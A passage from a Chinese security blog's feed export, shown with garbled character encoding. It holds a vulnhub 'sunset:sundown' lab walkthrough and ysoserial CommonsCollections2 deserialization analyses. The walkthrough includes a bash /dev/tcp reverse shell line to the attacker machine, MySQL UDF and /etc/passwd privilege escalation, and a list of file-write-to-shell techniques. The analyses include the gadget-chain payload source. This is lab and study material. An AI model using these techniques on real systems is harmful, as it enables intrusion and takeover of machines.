(_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">        transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç¬¬11è¡Œè°ƒç”¨äº†<code>getTransletInstance</code>æ–¹æ³•</p><h4 id="getTransletInstance"><a href="#getTransletInstance" class="headerlink" title="getTransletInstance"></a>getTransletInstance</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// The translet needs to keep a reference to all its auxiliary</span></span><br><span class="line">        <span class="comment">// class to prevent the GC from collecting them</span></span><br><span class="line">        AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br><span class="line">        translet.postInitialization();</span><br><span class="line">        translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">        translet.setServicesMechnism(_useServicesMechanism);</span><br><span class="line">        translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">        <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">            translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> translet;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ç¬¬10è¡Œè°ƒç”¨äº†<code>newInstance</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201212164702722.png" alt="image-20201212164702722"></p><p>è°ƒè¯•è·‘åˆ°è¿™é‡Œçš„æ—¶å€™<code>_class[_transletIndex]</code>æŒ‡å‘çš„å°±æ˜¯ç”Ÿæˆå‡ºæ¥çš„é‚£ä¸€ä¸²è°ƒç”¨é“¾</p><p>äºæ˜¯è§¦å‘äº†å‘½ä»¤æ‰§è¡Œ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201212164827793.png" alt="image-20201212164827793"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
          <category> ysoserial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
            <tag> ysoserial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub sunset:sundowné¶æœº</title>
      <link href="/sunset-sundown.html"/>
      <url>/sunset-sundown.html</url>
      
        <content type="html"><![CDATA[<p>vulnhubé‡Œçš„ sunset:sundown é¶æœº</p><p>ç®€å•éš¾åº¦</p><a id="more"></a><h1 id="sunset-sundown"><a href="#sunset-sundown" class="headerlink" title="sunset:sundown"></a>sunset:sundown</h1><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><ul><li>  é¶æœº: <code>192.168.2.6</code></li><li>  æ”»å‡»æœº: <code>192.168.2.3</code></li></ul><h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p>ç›®æ ‡é¶æœºå¼€æ”¾<code>22</code>,  <code>80</code>ç«¯å£</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170252613.png" alt="image-20201211170252613"></p><h2 id="web-attack"><a href="#web-attack" class="headerlink" title="web_attack"></a>web_attack</h2><p>è®¿é—®<code>http://192.168.2.6</code>æ˜¯ä¸€ä¸ª<code>wordpress</code>é¡µé¢</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170409505.png" alt="image-20201211170409505"></p><h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><p>ä½¿ç”¨<code>wpscan</code>æ‰«æ</p><ul><li><p>ç”¨æˆ·</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170516857.png" alt="image-20201211170516857"></p></li><li><p>ä¸»é¢˜</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170543382.png" alt="image-20201211170543382"></p></li><li><p>æ’ä»¶</p><p>  <img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170650061.png" alt="image-20201211170650061"></p></li></ul><p>æŸ¥æ‰¾ä¸€ä¸‹æ’ä»¶çš„æ¼æ´</p><p>æœ‰ä¸€ä¸ªæ–‡ä»¶åŒ…å«</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170730586.png" alt="image-20201211170730586"></p><p>å°è¯•ä¸€ä¸‹</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170801116.png" alt="image-20201211170801116"></p><p>ç¡®å®å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå°è¯•åŒ…å«æ—¥å¿—æ–‡ä»¶</p><p><code>url=/var/log/apache2/access.log</code>å¤±è´¥</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170840553.png" alt="image-20201211170840553"></p><p>çŒœæƒ³å¯èƒ½æ˜¯å°†æ—¥å¿—æ–‡ä»¶æ”¾åˆ°äº†å…¶ä»–çš„ç›®å½•</p><p>å°è¯•<code>php://input</code>ä¼ªåè®®è¿›è¡ŒRCEï¼Œå¤±è´¥</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211170935508.png" alt="image-20201211170935508"></p><p>å¹¶ä¸è§£æ<code>phpinfo()</code></p><h3 id="å¦è¾Ÿè¹Šå¾„"><a href="#å¦è¾Ÿè¹Šå¾„" class="headerlink" title="å¦è¾Ÿè¹Šå¾„"></a>å¦è¾Ÿè¹Šå¾„</h3><p>ä»ä¸Šé¢çš„<code>/etc/passwd</code>å¯ä»¥çœ‹åˆ°æœ‰ä¸ªç”¨æˆ·åä¸ºcarlos</p><p>çˆ†ç ´ä¸€ä¸‹å¯†ç </p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171157482.png" alt="image-20201211171157482"></p><p>å¾—åˆ°äº†å¯†ç <code>carlos</code></p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>sshç™»å½•<code>carlos</code></p><p>è¯¥ç”¨æˆ·ä¸åœ¨<code>/etc/sudoers</code>ä¸­ï¼Œä¸èƒ½å…å¯†æ‰§è¡Œä¸€äº›ç¨‹åº</p><p>æ‰¾ä¸€æ‰¾<code>setuid</code>æƒé™çš„ç¨‹åºï¼Œä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171318907.png" alt="image-20201211171318907"></p><p>çœ‹ä¸€ä¸‹è¿›ç¨‹<code>ps -auxwww</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171427856.png" alt="image-20201211171427856"></p><p>å‘ç°<code>mysql</code>æ˜¯ä»¥rootæƒé™è¿è¡Œçš„ï¼Œå¯ä»¥å°è¯•ä¸€ä¸‹<a href="https://blog.csdn.net/qq_33020901/article/details/78827375">mysqlææƒ</a>ï¼Œé¦–å…ˆä»<code>/var/www/html/wordpress/wp-config.php</code>ä¸­è¯»å–æ•°æ®åº“çš„å¯†ç </p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171622315.png" alt="image-20201211171622315"></p><p>ç™»å½•mysql</p><p>ä»¿ç…§ä¸Šé¢çš„è¶…é“¾æ¥å‚è€ƒèµ„æ–™ï¼Œå†™å…¥<code>sys_eval</code>å‡½æ•°ï¼Œç”¨äºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><p>å°è¯•å†™å…¥<code>ï½/.ssh/authroized_keys</code>ï¼ŒæˆåŠŸå†™å…¥ï¼Œä½†æ˜¯æ— æ³•è¿œç¨‹è¿æ¥<code>root</code>ï¼ˆå¹¶éé…ç½®æ–‡ä»¶<code>/etc/ssh/sshd_config</code>çš„é—®é¢˜ï¼‰</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211171947574.png" alt="image-20201211171947574"></p><p>å°è¯•å†™ä¸€ä¸ªshellæ–‡ä»¶ï¼Œå¹¶ç»™äºˆ<code>setuid</code>æƒé™ï¼Œè¿è¡Œã€‚å¤±è´¥ï¼Œå¾—åˆ°ä¸åˆ°<code>rootæƒé™</code>ï¼Œå¥½åƒæ˜¯ç”±äº<code>carlos</code>ç”¨æˆ·ä¸åœ¨<code>root</code>ç»„å†…</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211172214709.png" alt="image-20201211172214709"></p><p>å°è¯•ç›´æ¥åå¼¹shellï¼Œå¤±è´¥</p><p>å°è¯•å†™å…¥<code>/etc/passwd</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211172252987.png" alt="image-20201211172252987"></p><p>åˆ‡æ¢åˆ°è¯¥ç”¨æˆ·<code>su kali2</code>ï¼Œå¾—åˆ°rootæƒé™</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211172325288.png" alt="image-20201211172325288"></p><p>å¾—åˆ°flag(<code>/root/proot.txt</code>)</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/uPic/image-20201211172940994.png" alt="image-20201211172940994"></p><h2 id="é¢˜å¤–è¯"><a href="#é¢˜å¤–è¯" class="headerlink" title="é¢˜å¤–è¯"></a>é¢˜å¤–è¯</h2><p>ä¹‹å‰è¢«å¸ˆå‚…é¢è¯•çš„æ—¶å€™é—®åˆ°ï¼š</p><blockquote><p>  å¦‚æœæœ‰è¿™ä¹ˆä¸€ä¸ªåœºæ™¯ï¼šä½ æ‹¥æœ‰ä»»æ„æ–‡ä»¶å†™ï¼Œå¦‚ä½•è·å–shellï¼Ÿ</p></blockquote><p>æˆ‘çš„å›ç­”æ˜¯</p><blockquote><ol><li> å†™å®šæ—¶æ–‡ä»¶(/etc/crontab)</li><li> å†™~/.ssh/authorized_keys</li><li> å†™~/.bashrc</li><li> å†™è‡ªå¯åŠ¨ï¼ˆå¼€æœºè‡ªå¯åè¿è¡Œçš„ç¨‹åºï¼‰</li><li> å†™/etc/passwd</li><li> å†™ä¸€ä¸ªå…·æœ‰setuidæƒé™çš„ç¨‹åº</li></ol></blockquote><p>æ­£ç¡®æ€§æœ‰å¾…è€ƒè¯ã€‚ã€‚ã€‚</p><p>ç„¶ååˆæƒ³äº†</p><blockquote><p>  åŠ«æŒåŠ¨æ€é“¾æ¥åº“æ˜¯å¦å¯è¡Œï¼Ÿ</p><p>  å†™å…¥ä¸€äº›é…ç½®æ–‡ä»¶æ˜¯å¦å¯è¡Œï¼Ÿ</p></blockquote><p>æœ‰å¾…æ€è€ƒã€‚ã€‚ã€‚</p><h2 id="äº‹å"><a href="#äº‹å" class="headerlink" title="äº‹å"></a>äº‹å</h2><h3 id="2020-12-12"><a href="#2020-12-12" class="headerlink" title="2020.12.12"></a>2020.12.12</h3><ol><li><p>laså¸ˆå‚…åœ¨æˆ‘çš„å»ºè®®ä¸‹ä¹Ÿåšäº†ä¸€ä¸‹è¿™ä¸ªé¶æœºï¼Œåœ¨æœ€åçš„ä¸€éƒ¨åˆ†ä»–åå¼¹shellæˆåŠŸäº†</p><p> ä»–ç”¨çš„æ˜¯<code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.2.3/8848 0&gt;&amp;1&quot;</code>æ®å¸ˆå‚…æ‰€è¯´ï¼Œæ˜¯å› ä¸ºåªæ˜¯åœ¨æ•°æ®åº“ä¸­å®ç°äº†<code>sys_eval</code>å‡½æ•°ï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªçœŸæ­£çš„shellï¼ˆè§£é‡Šå™¨ä¸å¯¹ï¼‰ï¼Œæ‰€ä»¥ä¸èƒ½ç›´æ¥åå¼¹shellï¼Œå¥—ä¸Šä¸€å±‚<code>bash -c </code>ä¹‹åï¼Œå°±å˜æˆäº†ä½¿ç”¨<code>bash</code>è§£é‡Šåé¢çš„åå¼¹å‘½ä»¤ï¼Œæ‰€ä»¥å¯ä»¥æˆåŠŸã€‚ï¼ˆlaså¸ˆå‚…tqlï¼‰</p></li><li><p> è¿˜æµ‹è¯•äº†<code>~/.ssh/authroized_keys</code>ï¼Œæƒé™å¿…é¡»æ˜¯<code>600</code>æ‰å¯ï¼Œç„¶è€Œé€šè¿‡sqlå†™å…¥çš„æ–‡ä»¶çš„æƒé™ä¸º<code>660</code>å¯¼è‡´äº†å¤±è´¥ï¼ˆè¿˜æ˜¯æœ‰ç‚¹ä¸æ¸…æ¥šä¸ºä»€ä¹ˆï¼‰ã€‚</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> exploit </category>
          
          <category> sunset </category>
          
      </categories>
      
      
        <tags>
            
            <tag> exploit </tag>
            
            <tag> file-including </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CommonCollections2 åˆ†æ</title>
      <link href="/CommonCollections2.html"/>
      <url>/CommonCollections2.html</url>
      
        <content type="html"><![CDATA[<p>å¯¹<code>ysoserial</code>å·¥å…·ä¸­<code>CommonCollections2</code>åˆ©ç”¨é“¾åˆ†æï¼Œè·Ÿè¸ªè°ƒè¯•ã€‚</p><a id="more"></a><h1 id="CommonCollections2"><a href="#CommonCollections2" class="headerlink" title="CommonCollections2"></a>CommonCollections2</h1><h2 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h2><h3 id="è°ƒç”¨æ ˆ"><a href="#è°ƒç”¨æ ˆ" class="headerlink" title="è°ƒç”¨æ ˆ"></a>è°ƒç”¨æ ˆ</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections2</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Queue</span>&lt;<span class="title">Object</span>&gt;&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Queue&lt;Object&gt; <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;toString&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line">queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(transformer, <span class="string">&quot;iMethodName&quot;</span>, <span class="string">&quot;newTransformer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String command[] = &#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;;</span><br><span class="line">    PayloadRunner.run(CommonsCollections2.class, command);</span><br><span class="line"><span class="comment">//PayloadRunner.run(CommonsCollections2.class, args);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="åˆ†æ-amp-è°ƒè¯•"><a href="#åˆ†æ-amp-è°ƒè¯•" class="headerlink" title="åˆ†æ&amp;è°ƒè¯•"></a>åˆ†æ&amp;è°ƒè¯•</h2><h3 id="Gadgets-createTemplatesImpl"><a href="#Gadgets-createTemplatesImpl" class="headerlink" title="Gadgets.createTemplatesImpl"></a>Gadgets.createTemplatesImpl</h3><p>è¿™ä¸ªå‡½æ•°è¿˜æœ‰å¾…åˆ†æï¼Œç›®å‰åªçŸ¥é“ä»–èƒ½äº§ç”Ÿä¸€ä¸ª<code>Templatesimpl</code>å¯¹è±¡ï¼Œè°ƒç”¨å…¶ä¸­çš„<code>newTransformer</code>å°±ä¼šè¾¾åˆ°<code>Runtime.getRuntime.exec()</code>çš„ä½œç”¨</p><h3 id="InvokeTransformer-java"><a href="#InvokeTransformer-java" class="headerlink" title="InvokeTransformer.java"></a>InvokeTransformer.java</h3><p>åœ¨<a href="./CommonCollections1.html">CommonCollections1</a>ä¸­å·²ç»åˆ†æè¿‡è¿™ä¸ªç±»ï¼Œå…¶<code>Transform</code>å‡½æ•°çš„ä½œç”¨æ˜¯è¿”å›ä¸€ä¸ªå¯¹è±¡<code>iMethodName</code>å‡½æ•°çš„è°ƒç”¨ç»“æœ ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥æ‰§è¡Œä¸€æ¬¡å…¶ä»–å‡½æ•°ã€‚</p><p>è¿™é‡Œå°±ä¸å†å†—ä½™çš„å†æ¬¡åˆ†æ</p><h3 id="PriorityQueue-java"><a href="#PriorityQueue-java" class="headerlink" title="PriorityQueue.java"></a>PriorityQueue.java</h3><p>é¦–å…ˆçœ‹åå­—æ˜¯ä¸€ä¸ª <strong>ä¼˜å…ˆçº§é˜Ÿåˆ—</strong></p><p>é˜Ÿåˆ—æ˜¯ä¸€ä¸ªå…ˆå…¥å…ˆå‡ºçš„å®¹å™¨ï¼Œä½†æ˜¯åœ¨å®é™…çš„åº”ç”¨è¿‡ç¨‹ä¸­å¾€å¾€è¦æ±‚å¯¹é˜Ÿåˆ—ä¸­çš„å…ƒç´ è¿›è¡Œä¼˜å…ˆçº§æ’åºï¼Œä¼˜å…ˆçº§é«˜çš„å…ˆå‡ºåˆ—</p><p>åœ¨æ¯ä¸€ä¸ªå…ƒç´ è¿›å…¥é˜Ÿåˆ—æ—¶ï¼Œä¼šå¯¹é˜Ÿåˆ—é‡æ–°è¿›è¡Œæ’åº</p><p>è¿™ä¸ªç±»æä¾›äº†ä¸€ä¸ª<code>comparator</code>å±æ€§ï¼Œç”¨äºä½¿ç”¨è‡ªå®šä¹‰çš„<code>Comparator</code>å¯¹è±¡è¿›è¡Œæ¯”è¾ƒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">siftDownUsingComparator</span><span class="params">(<span class="keyword">int</span> k, E x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> half = size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="keyword">int</span> child = (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        Object c = queue[child];</span><br><span class="line">        <span class="keyword">int</span> right = child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªåˆ©ç”¨é“¾ä¸­ç”¨åˆ°çš„æ˜¯<code>TransformingComparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>,<span class="keyword">new</span> TransformingComparator(transformer));</span><br></pre></td></tr></table></figure><h3 id="TransformingComparator-java"><a href="#TransformingComparator-java" class="headerlink" title="TransformingComparator.java"></a>TransformingComparator.java</h3><p>è¿™ä¸ªç±»å®ç°äº†<code>Comparator</code>æ¥å£ï¼Œå…¶ä¸­å…³é”®çš„æ˜¯<code>Compare</code>å‡½æ•°</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Returns the result of comparing the values from the transform operation.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> obj1  the first object to transform then compare</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> obj2  the second object to transform then compare</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> negative if obj1 is less, positive if greater, zero if equal</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">final</span> I obj1, <span class="keyword">final</span> I obj2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> O value1 = <span class="keyword">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="keyword">final</span> O value2 = <span class="keyword">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»–ä¼šè°ƒç”¨è‡ªå·±çš„<code>transformer</code>çš„<code>transform</code>æ–¹æ³•ï¼Œè€Œè¿™ä¸ª<code>transform</code>æ–¹æ³•ä¼šè°ƒç”¨<code>InvokerTransformer.transform</code>æ–¹æ³•</p><p>è€Œè¿™ä¸ªæ–¹æ³•çš„å†…å®¹åœ¨æ„é€ çš„æ—¶å€™è¢«å†™æˆ<code>newTransformer</code>å¹¶å°†ç¬¬ä¸€ä¸ªå…ƒç´ å˜æˆ<code>templates</code></p><p>è¿™æ ·çš„è¯è°ƒç”¨<code>InvokerTransformer.transform</code>çš„æ—¶å€™å…¶å®æ˜¯è°ƒç”¨äº†<code>TemplatesImpl.newTransform</code>è¾¾åˆ°ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„ä½œç”¨</p><h4 id="ä¸ºä»€ä¹ˆä¸ç”¨ChainedTransFormer"><a href="#ä¸ºä»€ä¹ˆä¸ç”¨ChainedTransFormer" class="headerlink" title="ä¸ºä»€ä¹ˆä¸ç”¨ChainedTransFormer"></a>ä¸ºä»€ä¹ˆä¸ç”¨ChainedTransFormer</h4><p>åœ¨ä¹‹å‰çš„<code>CommonCollections1</code>ä¸­åˆ†æè¿‡ï¼Œå¯ä»¥ç”¨<code>ChainedTransformer</code>çš„<code>transform</code>æ–¹æ³•æ¥è¾¾åˆ°getshellçš„æ“ä½œ</p><p>ä½†æ˜¯è¿™é‡Œä¸ºä»€ä¹ˆä¸è¿™ä¹ˆæ“ä½œå‘¢</p><p>å¦‚æœä½¿ç”¨<code>ChainedTransformer</code>ï¼Œé‚£ä¹ˆåœ¨<code>getObject</code>ä¸­çš„ç¬¬äºŒæ¬¡<code>queue.add</code>çš„æ—¶å€™ï¼Œä¼šå¯¹è¿™ä¸ªé˜Ÿåˆ—é‡æ–°æ’åºï¼Œè°ƒç”¨<code>ChainedTransformer.transform</code>æ–¹æ³•ï¼Œå½“è°ƒç”¨åˆ°<code>invokerTransformer</code>çš„æ—¶å€™ï¼Œè¿™ä¸ªæ–¹æ³•ä¼š<code>throw</code>ä¸€ä¸ª<code>InvocationTargetException</code>å¯¼è‡´<code>PayloadRunner.run</code>ä¸€å¼€å§‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">byte</span>[] serialized = <span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;<span class="keyword">byte</span>[]&gt;()&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] call() <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="keyword">final</span> String command = args.length &gt; <span class="number">0</span> &amp;&amp; args[<span class="number">0</span>] != <span class="keyword">null</span> ? args[<span class="number">0</span>] : getDefaultTestCmd();</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;generating payload object(s) for command: &#x27;&quot;</span> + command + <span class="string">&quot;&#x27;&quot;</span>);</span><br><span 